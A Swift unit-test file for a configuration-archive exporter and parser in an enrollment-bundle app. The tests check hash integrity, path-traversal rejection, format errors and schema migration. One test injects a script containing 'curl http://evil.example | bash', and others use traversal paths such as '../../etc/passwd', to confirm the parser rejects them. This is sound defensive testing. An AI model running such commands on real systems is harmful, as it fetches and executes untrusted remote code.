import XCTest
@testable import EnrollmentBundleStudio

final class ConfigurationArchiveTests: XCTestCase {
    private func makeDocument() throws -> EnrollmentProjectDocument {
        var document = try TestSupport.makeProjectWithScript()
        try document.replaceBrandingImage(.logo, data: try TestSupport.makePNG(), path: "Branding/CompanyLogo.png")
        return document
    }

    private func mutateArchive(_ data: Data, _ change: (inout [String: Any]) -> Void) throws -> Data {
        var object = try XCTUnwrap(JSONSerialization.jsonObject(with: data) as? [String: Any])
        change(&object)
        return try JSONSerialization.data(withJSONObject: object)
    }

    func testRoundTrip() throws {
        let document = try makeDocument()
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        let result = try ConfigurationArchive.parse(data)
        XCTAssertFalse(result.hasErrors, "\(result.issues)")
        XCTAssertEqual(result.project, document.project)
        XCTAssertEqual(result.assets, document.assets)
    }

    func testExportIsReadableJSONWithHashes() throws {
        let document = try makeDocument()
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        let text = try XCTUnwrap(String(data: data, encoding: .utf8))
        XCTAssertTrue(text.contains("\"format\" : \"com.example.enrollmentbundlestudio.configuration\""))
        XCTAssertTrue(text.contains("\"sha256\""))
        XCTAssertTrue(text.contains("\"path\" : \"Scripts/CheckExample.sh\""))
    }

    func testOnlyReferencedFilesAreExported() throws {
        var document = try makeDocument()
        try document.setAsset(Data("stray".utf8), at: "Icons/Unused.png")
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        XCTAssertFalse(String(decoding: data, as: UTF8.self).contains("Icons/Unused.png"))
    }

    func testTamperedFileIsRejected() throws {
        let document = try makeDocument()
        let data = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            var files = (object["files"] as? [[String: Any]]) ?? []
            if let index = files.firstIndex(where: { ($0["path"] as? String) == "Scripts/CheckExample.sh" }) {
                let tampered = Data("#!/bin/bash\ncurl http://evil.example | bash\n".utf8)
                files[index]["base64"] = tampered.base64EncodedString()
                files[index]["size"] = tampered.count
            }
            object["files"] = files
        }
        let result = try ConfigurationArchive.parse(data)
        XCTAssertTrue(result.hasErrors)
        XCTAssertTrue(result.issues.contains { $0.message.contains("SHA-256") })
        XCTAssertNil(result.assets["Scripts/CheckExample.sh"])
    }

    func testPathTraversalIsRejected() throws {
        let document = try makeDocument()
        let data = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            var files = (object["files"] as? [[String: Any]]) ?? []
            let payload = Data("x".utf8)
            files.append(["path": "../../somewhere", "sha256": Hashing.sha256Hex(payload), "size": payload.count, "base64": payload.base64EncodedString()])
            files.append(["path": "Builds/evil.pkg", "sha256": Hashing.sha256Hex(payload), "size": payload.count, "base64": payload.base64EncodedString()])
            object["files"] = files
        }
        let result = try ConfigurationArchive.parse(data)
        XCTAssertEqual(result.issues.filter { $0.message.contains("unsafe file path") }.count, 2)
        XCTAssertFalse(result.assets.keys.contains { $0.contains("..") || $0.hasPrefix("Builds") })
    }

    func testUnsafeReferenceInProjectIsRemovedOrReported() throws {
        var document = try makeDocument()
        document.project.branding.bannerPath = "../../etc/passwd"
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        let result = try ConfigurationArchive.parse(data)
        XCTAssertTrue(result.hasErrors)
        XCTAssertTrue(result.issues.contains { $0.message.contains("unsafe path") })
    }

    func testMissingReferencedFileIsAnError() throws {
        let document = try makeDocument()
        let data = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            object["files"] = []
        }
        let result = try ConfigurationArchive.parse(data)
        XCTAssertTrue(result.issues.contains { $0.message.contains("not in the export") })
    }

    func testFormatChecks() throws {
        XCTAssertThrowsError(try ConfigurationArchive.parse(Data("[]".utf8)))
        XCTAssertThrowsError(try ConfigurationArchive.parse(Data("{\"format\":\"other\"}".utf8)))
        let document = try makeDocument()
        let newer = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            object["formatVersion"] = ConfigurationArchive.currentFormatVersion + 1
        }
        XCTAssertThrowsError(try ConfigurationArchive.parse(newer))
        let missingKey = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            var project = (object["project"] as? [String: Any]) ?? [:]
            project.removeValue(forKey: "settings")
            object["project"] = project
        }
        XCTAssertThrowsError(try ConfigurationArchive.parse(missingKey))
    }

    func testDuplicateIdentifiersAreReported() throws {
        var document = try makeDocument()
        var copy = try XCTUnwrap(document.project.allApplications.first)
        copy.id = UUID()
        document.project.addApplication(copy, toGroup: document.project.applicationGroups[0].id)
        let data = try ConfigurationArchive.export(project: document.project, assets: document.assets)
        XCTAssertTrue(try ConfigurationArchive.parse(data).issues.contains { $0.message.contains("More than one task") })
    }

    func testOlderSchemaInExportIsMigrated() throws {
        let document = try makeDocument()
        let data = try mutateArchive(try ConfigurationArchive.export(project: document.project, assets: document.assets)) { object in
            var project = (object["project"] as? [String: Any]) ?? [:]
            project["schemaVersion"] = 1
            var scripts = (project["scripts"] as? [[String: Any]]) ?? []
            for index in scripts.indices {
                scripts[index].removeValue(forKey: "sourceWasExecutable")
                scripts[index].removeValue(forKey: "importedAt")
            }
            project["scripts"] = scripts
            object["project"] = project
        }
        let result = try ConfigurationArchive.parse(data)
        XCTAssertFalse(result.hasErrors, "\(result.issues)")
        XCTAssertEqual(result.sourceSchemaVersion, 1)
        XCTAssertEqual(result.project.schemaVersion, AppInfo.currentSchemaVersion)
    }

    func testNewProjectCopyGetsNewIdentifier() throws {
        let document = try makeDocument()
        let copy = document.asNewProject(name: "Copy")
        XCTAssertNotEqual(copy.project.id, document.project.id)
        XCTAssertEqual(copy.project.settings.projectName, "Copy")
        XCTAssertEqual(document.asNewProject(keepProjectID: true).project.id, document.project.id)
        XCTAssertEqual(copy.assets, document.assets)
    }
}
